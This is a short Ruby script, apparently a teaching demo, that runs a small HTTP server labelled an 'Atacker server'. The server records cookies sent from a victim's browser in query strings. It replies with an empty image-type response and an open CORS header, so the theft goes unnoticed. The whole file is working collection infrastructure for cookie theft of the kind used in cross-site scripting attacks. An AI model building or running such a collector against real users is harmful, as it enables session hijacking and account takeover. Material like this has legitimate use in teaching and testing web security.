# http_server.rb
require 'socket'
require 'rack'

PORT = 3000

server = TCPServer.new PORT

puts "Atacker server is online... http://localhost:#{PORT}\n\n"

loop do
  session = server.accept
  request = session.gets
  puts request

  _method, full_path = request.split(' ')
  _path, query = full_path.split('?')
  query_params = Rack::Utils.parse_nested_query(query)

  puts 'Saving the cookies I received from the victim'
  puts query_params
  puts "\n"

  session.print "HTTP/1.1 204\r\n" # 1
  session.print "Content-Type: image/jpeg\r\n"
  session.print "Access-Control-Allow-Origin: *\r\n"
  session.print "\r\n" # 3

  session.close
end
